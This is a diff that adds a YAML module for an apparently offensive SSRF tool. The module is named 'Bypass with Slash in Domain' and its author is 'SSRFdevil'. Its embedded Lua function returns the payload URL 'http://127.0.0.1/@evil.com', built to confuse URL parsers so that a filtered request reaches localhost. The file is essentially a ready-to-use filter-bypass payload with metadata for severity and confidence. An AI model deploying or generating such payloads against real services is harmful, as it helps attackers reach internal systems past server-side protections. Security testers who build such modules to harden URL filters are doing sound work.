@@ -1,0 +1,24 @@
+meta:
+  id: bypass_slash
+  version: 1
+  name: "Bypass with Slash in Domain"
+  description: "Uses slash to confuse URL parser"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 70
+  confidence: 80
+  severity: medium
+  tags: [parser, slash, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [http]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://127.0.0.1/@evil.com" }
+    end
